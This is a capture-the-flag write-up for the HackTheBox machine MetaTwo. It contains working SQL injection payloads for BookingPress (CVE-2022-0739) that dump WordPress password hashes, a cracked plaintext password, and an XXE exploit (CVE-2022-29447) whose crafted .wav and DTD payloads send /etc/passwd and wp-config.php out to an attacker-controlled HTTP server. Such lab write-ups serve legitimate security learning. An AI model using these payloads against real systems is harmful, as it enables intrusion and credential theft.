# [HTB] MetaTwo - Penetration Testing Report
# Executive Summary
* **Target OS:** Linux
* **Difficulty:** Easy
* **Target IP:** 10.129.228.95
* **Vectors Used:** WordPress BookingPress SQLi (CVE-2022-0739), WordPress XXE (CVE-2022-29447), Passpie Credential Abuse

# 1. Reconnaissance
Nmap was used for port scan against target
```bash
nmap -sV -sC 10.129.228.95
```
```bash
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-04 04:32 -0500
Nmap scan report for metapress.htb (10.129.228.95)
Host is up (0.57s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp?
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MetaPress &#8211; Official company site
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.6.2
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 254.82 seconds
```
<br>

Scan Result
|port|status|service|
|:---|:---|:---|
|21|open|FTP(vsftpd)|
|22|open|SSH(OpenSSH 8.4p1)|
|80|open|HTTP(nginx 1.18.0)|

<br>

# 2. Vulnerability Assessment
Following is the main page of target machine, which was powered by `Wordpress`
<img width="600" height="400" alt="image" src="https://github.com/user-attachments/assets/0c7ec345-c65b-45aa-abc1-ded58805b8af" />

<br>

`WPscan` was attempted, but nothing showed from the target system. As shown above, the only option was to visit `events` to check if any useful information could be found. Visiting the directory itself showed none of the useful information. Checking the source of the page, the `events` directory was ran by `bookingpress 1.0.11`, which is vulnerable to SQLi (CVE-2022-0739).
<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/29166e3c-b296-4025-8b7a-164bd2aa8137" />

<br>

## 2-1. BookingPress SQLi (CVE-2022-0739)
Searching for confirmed vulnerability, the exploitation uses vulnerability inside `admin-ajax.php` under `wp-admin` directory, which was not using sanitized parameter. Following is the payload:
```bash
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=ba6f278b09&category_id=33&total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
```

<br>

Becacuse of the weak sanitization and it is confirmed that the internal database is MySQL, it is confirmed that the internal database could be accessed with `UNION` injection once the attacker knows value of `_wpnonce`. In this case, it could be found on the source of the outdated `BookingPress` source page. As shown below, the value, in this case, was `ca4101431a`:
<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/fbf6e1bc-e788-4750-9fe0-b926110a6c67" />

<br>

Once the attacker confirmed the attack is working via checking the basic information about database, he/she could change the payload for getting credentials out of database. Since tables and databases of `WordPress` is well known, only by changing necessary parts of payload for gathering information could easily allow access to the user credential. Following is the payload for getting user credentials and output organization:
```bash
curl -s -q 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&_wpnonce=ca4101431a&category_id=33&total_service=-7502) UNION ALL SELECT user_login,user_pass,@@version_compile_os,1,2,3,4,5,6 from wp_users-- -' | jq .
```
<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/93b1c1a4-b939-454f-8ccd-59876994196a" />

<br>

As shown above, database allowed malicious actor to access the existing user credentials. Hashcat was used to crack the found password hashes:
```bash
hashcat -m 400 hash.txt /usr/share/wordlists/rockyou.txt
```
Unfortunately, hashcat couldn't break the hash value of user `admin`. However, hashcat successfully cracked the password hash of username `manager`, which is `partylikearockstar`. Using the found credential `manager:partylikearockstar`, it was successful to login as administrator into `wp-admin`:
<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/2887a608-9182-4ace-af99-8c89d7034935" />

<br>

## 2-2. WordPress XXE (CVE-2022-29447)
Since the web application is using `WordPress 5.6.2`, it is vulnerable to `WordPress XML eXternal Entity (CVE-2022-29447)`. Attacker could exploit this vulnerability by uploading `.wav` extension as new media file. For creating the malicious XML embedded `.wav` file, following payload was used:
```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.16.155:8000/anyname.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

<br>

Above payload does trigger malicious commands inside `anyname.dtd (Document Type Definition)` file thorugh opened http server on port 8000 to victim's machine, which allows to reference server's local file, gaining vulnerable information from internal system. To check if the payload works properly, attacker could test it via reading the contents of `/etc/passwd`. Following is the contents of `anyname.dtd` file:
```bash
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.155:8000/?p=%file;'>">
```

<br>

once the .dtd file triggered, it will read contents of /etc/passwd, convert it into base64 encoded format, sending the encoded contents to the attacker's opened http server on port 8000. Following is the result of uploading malicious `.wav` file into web application's `upload new media` section:
<img width="1718" height="998" alt="image" src="https://github.com/user-attachments/assets/d1b5b3ec-8678-4e51-8249-b7bc6d0be747" />

<br>

Decoding the base64-encrypted contents of `/etc/passwd`, following information was discovered:
```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
```

<br>

It is confirmed that there is one user that has bash shell excluding root user, `jnelson`. Confirming the paylaod is working properly, since web administrator has privilege to read configuration file of the web application including `/wp-admin` directory, attacker now could read the contents of `wp-config.php`, which mostly contains the configuration information about `WordPress` based web application via directory traversal attack if the attacker does not know the exact location of the file by using `..` in front of the file directory. Following is the final payload for targeting the contents of `wp-config.php`:
```bash
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=../wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.155:8000/?p=%file;'>">
```
